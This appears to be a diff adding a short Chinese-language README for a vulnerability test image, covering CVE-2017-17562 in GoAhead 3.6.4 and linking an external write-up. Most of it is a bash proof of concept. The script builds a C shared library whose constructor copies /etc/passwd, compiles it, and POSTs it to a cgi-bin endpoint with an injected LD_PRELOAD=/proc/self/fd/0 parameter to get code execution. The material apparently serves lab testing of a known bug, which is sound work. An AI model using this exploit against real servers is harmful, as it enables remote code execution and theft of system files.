@@ -1,0 +1,30 @@
+## CVE-2017-17562 - LD_PRELOAD cgi env 注入漏洞
+
+测试镜像
+
+* src/goahead/3.6.4/
+
+参考链接
+
+* [REMOTE LD_PRELOAD EXPLOITATION](https://www.elttam.com.au/blog/goahead/)
+
+Poc 
+
+```
+#!/bin/bash
+
+cat > payload.c << EOF
+void __attribute__ ((constructor)) setup ()
+{
+	unsetenv("LD_PRELOAD");
+	
+    system("cp /etc/passwd /tmp");
+    write(1, "Hello: World!\n", 14);
+}
+EOF
+
+gcc -fPIC -shared payload.c -o payload.so
+
+curl -i -X POST --data-binary @payload.so "http://127.0.0.1/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0"
+```
+
